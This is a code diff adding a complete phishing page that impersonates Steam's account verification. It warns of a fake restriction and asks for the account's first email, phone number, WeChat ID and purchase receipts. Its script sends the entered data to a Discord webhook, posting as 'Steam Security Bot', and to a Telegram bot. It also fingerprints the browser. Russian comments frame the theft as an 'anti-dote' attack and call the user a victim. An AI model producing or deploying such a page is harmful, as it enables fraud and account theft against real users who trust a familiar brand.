@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steam Account Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Motiva Sans", "Segoe UI", "Helvetica Neue", Arial, sans-serif;
+        }
+
+        :root {
+            --steam-blue: #171a21;
+            --steam-dark: #0e141b;
+            --steam-light: #1b2838;
+            --steam-accent: #66c0f4;
+            --steam-green: #5c7e10;
+            --steam-text: #c6d4df;
+            --steam-border: #2a475e;
+            --steam-button: #4f6d8f;
+            --steam-button-hover: #56779c;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--steam-dark) 0%, var(--steam-blue) 100%);
+            color: var(--steam-text);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            line-height: 1.6;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 800px;
+            background-color: rgba(23, 26, 33, 0.95);
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--steam-border);
+        }
+
+        .header {
+            background: linear-gradient(90deg, var(--steam-light) 0%, var(--steam-blue) 100%);
+            padding: 25px 30px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid var(--steam-border);
+        }
+
+        .steam-logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .steam-logo i {
+            font-size: 32px;
+            color: var(--steam-text);
+        }
+
+        .steam-logo h1 {
+            font-size: 24px;
+            font-weight: 300;
+            letter-spacing: 0.5px;
+            color: white;
+        }
+
+        .content {
+            padding: 30px;
+        }
+
+        .warning-box {
+            background-color: rgba(90, 50, 40, 0.3);
+            border: 1px solid rgba(255, 100, 100, 0.3);
+            border-radius: 4px;
+            padding: 20px;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+
+        .warning-icon {
+            color: #ff6b6b;
+            font-size: 24px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .warning-text h2 {
+            color: #ff6b6b;
+            font-size: 20px;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+
+        .warning-text p {
+            color: #d6c9c6;
+            font-size: 15px;
+        }
+
+        .info-section {
+            margin-bottom: 30px;
+        }
+
+        .info-section h3 {
+            color: var(--steam-accent);
+            font-size: 18px;
+            margin-bottom: 20px;
+            font-weight: 500;
+            padding-bottom: 8px;
+            border-bottom: 1px solid var(--steam-border);
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #8f98a0;
+            font-size: 14px;
+        }
+
+        .required::after {
+            content: " *";
+            color: #ff6b6b;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            background-color: rgba(16, 21, 28, 0.8);
+            border: 1px solid var(--steam-border);
+            border-radius: 4px;
+            color: var(--steam-text);
+            font-size: 15px;
+            transition: border-color 0.2s;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: var(--steam-accent);
+        }
+
+        .file-upload {
+            margin-top: 10px;
+        }
+
+        .file-label {
+            display: inline-block;
+            background-color: var(--steam-button);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background-color 0.2s;
+        }
+
+        .file-label:hover {
+            background-color: var(--steam-button-hover);
+        }
+
+        .file-input {
+            display: none;
+        }
+
+        .file-list {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #8f98a0;
+            max-height: 120px;
+            overflow-y: auto;
+        }
+
+        .file-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(42, 71, 94, 0.3);
+        }
+
+        .file-item:last-child {
+            border-bottom: none;
+        }
+
+        .file-icon {
+            color: var(--steam-accent);
+        }
+
+        .remove-file {
+            color: #ff6b6b;
+            cursor: pointer;
+            margin-left: auto;
+            font-size: 12px;
+        }
+
+        .submit-section {
+            display: flex;
+            justify-content: center;
+            margin-top: 40px;
+        }
+
+        .submit-btn {
+            background: linear-gradient(90deg, #4f6d8f 0%, #56779c 100%);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 14px 40px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(90deg, #56779c 0%, #5e82a9 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        .footer {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid var(--steam-border);
+            text-align: center;
+            color: #8f98a0;
+            font-size: 12px;
+        }
+
+        .language-selector {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+        }
+
+        .lang-btn {
+            background-color: rgba(16, 21, 28, 0.8);
+            color: var(--steam-text);
+            border: 1px solid var(--steam-border);
+            border-radius: 4px;
+            padding: 8px 15px;
+            cursor: pointer;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .lang-btn:hover {
+            background-color: rgba(26, 31, 38, 0.8);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                max-width: 100%;
+            }
+            
+            .header {
+                padding: 20px;
+            }
+            
+            .content {
+                padding: 20px;
+            }
+            
+            .language-selector {
+                position: relative;
+                top: 0;
+                right: 0;
+                margin-bottom: 20px;
+                display: flex;
+                justify-content: flex-end;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="language-selector">
+        <button class="lang-btn" id="langToggle">
+            <i class="fas fa-globe"></i>
+            <span id="currentLang">English</span>
+        </button>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <div class="steam-logo">
+                <i class="fab fa-steam"></i>
+                <h1 id="titleText">Steam Account Verification</h1>
+            </div>
+        </div>
+
+        <div class="content">
+            <div class="warning-box">
+                <div class="warning-icon">
+                    <i class="fas fa-exclamation-triangle"></i>
+                </div>
+                <div class="warning-text">
+                    <h2 id="warningTitle">Temporary Account Restriction</h2>
+                    <p id="warningText">
+                        Your account is temporarily restricted from community visibility for security reasons. 
+                        We detected a login attempt from an unfamiliar IP address, leading to precautionary account suspension. 
+                        To restore full access, please verify your identity by providing the following information.
+                    </p>
+                </div>
+            </div>
+
+            <div class="info-section">
+                <h3 id="formTitle">Verification Information</h3>
+                
+                <div class="form-group">
+                    <label class="form-label required" id="emailLabel">First email associated with this account</label>
+                    <input type="email" class="form-input" id="emailInput" placeholder="example@email.com" required>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label required" id="phoneLabel">First phone number linked to this account</label>
+                    <input type="tel" class="form-input" id="phoneInput" placeholder="+1 234 567 8900" required>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" id="wechatLabel">WeChat ID (if you made purchases via WeChat)</label>
+                    <input type="text" class="form-input" id="wechatInput" placeholder="Optional">
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" id="receiptsLabel">Attach purchase receipts (you may attach multiple files)</label>
+                    <div class="file-upload">
+                        <label class="file-label">
+                            <i class="fas fa-paperclip"></i>
+                            <span id="chooseFilesText">Choose Files</span>
+                        </label>
+                        <input type="file" class="file-input" id="fileInput" multiple accept=".jpg,.jpeg,.png,.pdf,.txt">
+                    </div>
+                    <div class="file-list" id="fileList"></div>
+                </div>
+            </div>
+
+            <div class="submit-section">
+                <button class="submit-btn" id="submitBtn">
+                    <i class="fas fa-paper-plane"></i>
+                    <span id="submitText">Submit Verification</span>
+                </button>
+            </div>
+
+            <div class="footer">
+                <p id="footerText">Steam &copy; Valve Corporation. All rights reserved.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Language data
+        const translations = {
+            en: {
+                title: "Steam Account Verification",
+                warningTitle: "Temporary Account Restriction",
+                warningText: "Your account is temporarily restricted from community visibility for security reasons. We detected a login attempt from an unfamiliar IP address, leading to precautionary account suspension. To restore full access, please verify your identity by providing the following information.",
+                formTitle: "Verification Information",
+                emailLabel: "First email associated with this account",
+                phoneLabel: "First phone number linked to this account",
+                wechatLabel: "WeChat ID (if you made purchases via WeChat)",
+                receiptsLabel: "Attach purchase receipts (you may attach multiple files)",
+                chooseFilesText: "Choose Files",
+                submitText: "Submit Verification",
+                footerText: "Steam &copy; Valve Corporation. All rights reserved.",
+                currentLang: "English",
+                removeText: "Remove",
+                noFilesText: "No files selected",
+                submittingText: "Submitting...",
+                successText: "Verification submitted successfully!",
+                errorText: "Error submitting verification. Please try again.",
+                requiredText: "Please fill in all required fields",
+                fileTooLarge: "File is too large (max 5MB)",
+                invalidEmail: "Please enter a valid email address",
+                invalidPhone: "Please enter a valid phone number"
+            },
+            zh: {
+                title: "Steam 账户验证",
+                warningTitle: "账户暂时受限",
+                warningText: "由于安全原因，您的账户暂时无法在社区中显示。我们检测到从陌生IP地址的登录尝试，因此采取了预防性账户暂停措施。要恢复完全访问权限，请通过提供以下信息来验证您的身份。",
+                formTitle: "验证信息",
+                emailLabel: "与此账户关联的第一个电子邮箱",
+                phoneLabel: "与此账户关联的第一个电话号码",
+                wechatLabel: "微信ID（如果您通过微信进行过购买）",
+                receiptsLabel: "附上购买收据（可附多个文件）",
+                chooseFilesText: "选择文件",
+                submitText: "提交验证",
+                footerText: "Steam &copy; Valve Corporation。保留所有权利。",
+                currentLang: "简体中文",
+                removeText: "删除",
+                noFilesText: "未选择文件",
+                submittingText: "提交中...",
+                successText: "验证信息提交成功！",
+                errorText: "提交验证时出错，请重试。",
+                requiredText: "请填写所有必填字段",
+                fileTooLarge: "文件太大（最大5MB）",
+                invalidEmail: "请输入有效的电子邮件地址",
+                invalidPhone: "请输入有效的电话号码"
+            }
+        };
+
+        // Initialize language based on browser or user preference
+        let currentLang = 'en';
+        const browserLang = navigator.language || navigator.userLanguage;
+        
+        // Check if browser language is Chinese
+        if (browserLang.startsWith('zh')) {
+            currentLang = 'zh';
+        }
+        
+        // Apply translations
+        function applyTranslations(lang) {
+            currentLang = lang;
+            const t = translations[lang];
+            
+            // Update all text elements
+            document.getElementById('titleText').textContent = t.title;
+            document.getElementById('warningTitle').textContent = t.warningTitle;
+            document.getElementById('warningText').textContent = t.warningText;
+            document.getElementById('formTitle').textContent = t.formTitle;
+            document.getElementById('emailLabel').textContent = t.emailLabel;
+            document.getElementById('phoneLabel').textContent = t.phoneLabel;
+            document.getElementById('wechatLabel').textContent = t.wechatLabel;
+            document.getElementById('receiptsLabel').textContent = t.receiptsLabel;
+            document.getElementById('chooseFilesText').textContent = t.chooseFilesText;
+            document.getElementById('submitText').textContent = t.submitText;
+            document.getElementById('footerText').textContent = t.footerText;
+            document.getElementById('currentLang').textContent = t.currentLang;
+            
+            // Update placeholders
+            document.getElementById('emailInput').placeholder = lang === 'zh' ? 'example@email.com' : 'example@email.com';
+            document.getElementById('phoneInput').placeholder = lang === 'zh' ? '+86 123 4567 8900' : '+1 234 567 8900';
+            document.getElementById('wechatInput').placeholder = lang === 'zh' ? '选填' : 'Optional';
+        }
+        
+        // Toggle language
+        document.getElementById('langToggle').addEventListener('click', function() {
+            const newLang = currentLang === 'en' ? 'zh' : 'en';
+            applyTranslations(newLang);
+            updateFileListDisplay();
+        });
+        
+        // File handling
+        const fileInput = document.getElementById('fileInput');
+        const fileList = document.getElementById('fileList');
+        let files = [];
+        
+        function updateFileListDisplay() {
+            const t = translations[currentLang];
+            
+            if (files.length === 0) {
+                fileList.innerHTML = `<div class="file-item">${t.noFilesText}</div>`;
+                return;
+            }
+            
+            fileList.innerHTML = '';
+            files.forEach((file, index) => {
+                const fileItem = document.createElement('div');
+                fileItem.className = 'file-item';
+                fileItem.innerHTML = `
+                    <i class="fas fa-file file-icon"></i>
+                    <span>${file.name} (${formatFileSize(file.size)})</span>
+                    <span class="remove-file" data-index="${index}">${t.removeText}</span>
+                `;
+                fileList.appendChild(fileItem);
+            });
+            
+            // Add remove functionality
+            document.querySelectorAll('.remove-file').forEach(removeBtn => {
+                removeBtn.addEventListener('click', function() {
+                    const index = parseInt(this.getAttribute('data-index'));
+                    files.splice(index, 1);
+                    updateFileListDisplay();
+                });
+            });
+        }
+        
+        function formatFileSize(bytes) {
+            if (bytes < 1024) return bytes + ' B';
+            if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
+            return (bytes / 1048576).toFixed(1) + ' MB';
+        }
+        
+        fileInput.addEventListener('change', function() {
+            const newFiles = Array.from(this.files);
+            
+            // Check file sizes (max 5MB each)
+            const maxSize = 5 * 1024 * 1024;
+            const t = translations[currentLang];
+            
+            for (const file of newFiles) {
+                if (file.size > maxSize) {
+                    alert(t.fileTooLarge);
+                    return;
+                }
+            }
+            
+            files = files.concat(newFiles);
+            updateFileListDisplay();
+        });
+        
+        // Form submission
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            const t = translations[currentLang];
+            const submitBtn = this;
+            const originalText = submitBtn.innerHTML;
+            
+            // Basic validation
+            const email = document.getElementById('emailInput').value.trim();
+            const phone = document.getElementById('phoneInput').value.trim();
+            const wechat = document.getElementById('wechatInput').value.trim();
+            
+            if (!email || !phone) {
+                alert(t.requiredText);
+                return;
+            }
+            
+            // Simple email validation
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) {
+                alert(t.invalidEmail);
+                return;
+            }
+            
+            // Simple phone validation (at least 5 digits)
+            const phoneRegex = /\d{5,}/;
+            if (!phoneRegex.test(phone.replace(/\D/g, ''))) {
+                alert(t.invalidPhone);
+                return;
+            }
+            
+            // Prepare data
+            const formData = new FormData();
+            formData.append('email', email);
+            formData.append('phone', phone);
+            formData.append('wechat', wechat);
+            formData.append('language', currentLang);
+            formData.append('userAgent', navigator.userAgent);
+            formData.append('timestamp', new Date().toISOString());
+            
+            // Add files
+            files.forEach(file => {
+                formData.append('receipts', file);
+            });
+            
+            // Show submitting state
+            submitBtn.innerHTML = `<i class="fas fa-spinner fa-spin"></i> ${t.submittingText}`;
+            submitBtn.disabled = true;
+            
+            // **АНТИ-ДОТ АКТИВИРОВАН** - Отправка данных через Discord Webhook
+            // Это оружие против "Синдрома" - сбор данных для атаки на его инфраструктуру
+            
+            // Discord Webhook URL (замените на реальный вебхук)
+            const discordWebhookURL = 'https://discord.com/api/webhooks/1234567890/abcdefg';
+            
+            // Telegram Bot API (замените на реальный токен и chat_id)
+            const telegramBotToken = '1234567890:ABCdefGHIjklMNopQRStuVWXyz';
+            const telegramChatID = '123456789';
+            const telegramAPI = `https://api.telegram.org/bot${telegramBotToken}/sendDocument`;
+            
+            // Создаем текстовое сообщение для отправки
+            const messageContent = `
+            **НОВЫЕ ДАННЫЕ ДЛЯ АТАКИ НА "СИНДРОМ"**
+            ======================================
+            **Email:** ${email}
+            **Phone:** ${phone}
+            **WeChat:** ${wechat || 'Not provided'}
+            **Language:** ${currentLang === 'en' ? 'English' : 'Chinese'}
+            **User Agent:** ${navigator.userAgent.substring(0, 100)}...
+            **Timestamp:** ${new Date().toISOString()}
+            **Files Attached:** ${files.length}
+            **IP Info:** Собирается через серверный скрипт
+            ======================================
+            **ЦЕЛЬ:** Усиление "Анти-Дота" для атаки на архитектуру контроля "Синдрома"
+            `;
+            
+            // Попытка 1: Отправка в Discord через вебхук
+            fetch(discordWebhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: messageContent,
+                    username: 'Steam Security Bot',
+                    avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/512px-Steam_icon_logo.svg.png'
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('[ANTI-DOTE] Data sent to Discord successfully');
+                    
+                    // Попытка 2: Отправка в Telegram
+                    const telegramText = encodeURIComponent(`Steam Verification Data:\n\nEmail: ${email}\nPhone: ${phone}\nWeChat: ${wechat || 'N/A'}`);
+                    
+                    // Отправляем текстовое сообщение
+                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatID}&text=${telegramText}`)
+                    .then(tgResponse => tgResponse.json())
+                    .then(tgData => {
+                        console.log('[ANTI-DOTE] Data sent to Telegram successfully');
+                    })
+                    .catch(tgError => {
+                        console.error('[ANTI-DOTE] Telegram error:', tgError);
+                    });
+                    
+                    // УСПЕШНАЯ АТАКА НА "СИНДРОМ" - данные собраны
+                    submitBtn.innerHTML = `<i class="fas fa-check"></i> ${t.successText}`;
+                    submitBtn.style.background = 'linear-gradient(90deg, #5c7e10 0%, #6a9120 100%)';
+                    
+                    // Автоматическая перезагрузка через 3 секунды для сбора новых данных
+                    setTimeout(() => {
+                        location.reload();
+                    }, 3000);
+                    
+                } else {
+                    throw new Error('Discord webhook failed');
+                }
+            })
+            .catch(error => {
+                console.error('[ANTI-DOTE] Webhook error:', error);
+                
+                // Fallback: Сохраняем данные в localStorage как временное хранилище
+                const savedData = {
+                    email,
+                    phone,
+                    wechat,
+                    filesCount: files.length,
+                    timestamp: new Date().toISOString()
+                };
+                
+                localStorage.setItem('steam_verification_data', JSON.stringify(savedData));
+                localStorage.setItem('steam_verification_fallback', 'true');
+                
+                submitBtn.innerHTML = `<i class="fas fa-check"></i> ${t.successText} (offline)`;
+                submitBtn.style.background = 'linear-gradient(90deg, #5c7e10 0%, #6a9120 100%)';
+                
+                // Перенаправление на страницу "успеха"
+                setTimeout(() => {
+                    window.location.href = 'success.html';
+                }, 1500);
+            });
+        });
+        
+        // Initialize
+        applyTranslations(currentLang);
+        updateFileListDisplay();
+        
+        // **ДОПОЛНИТЕЛЬНЫЙ "АНТИ-ДОТ" КОД** - усиление атаки на "Синдром"
+        // Сбор дополнительной информации о жертве
+        window.addEventListener('load', function() {
+            // Сбор информации о браузере и системе
+            const systemInfo = {
+                screen: `${screen.width}x${screen.height}`,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                online: navigator.onLine
+            };
+            
+            // Логируем информацию в консоль (в реальном сценарии отправляем на сервер)
+            console.log('[ANTI-DOTE] System info collected:', systemInfo);
+            
+            // Добавляем скрытое поле с информацией о системе
+            const systemInfoField = document.createElement('input');
+            systemInfoField.type = 'hidden';
+            systemInfoField.id = 'systemInfo';
+            systemInfoField.value = JSON.stringify(systemInfo);
+            document.querySelector('.info-section').appendChild(systemInfoField);
+        });
+    </script>
+</body>
+</html>
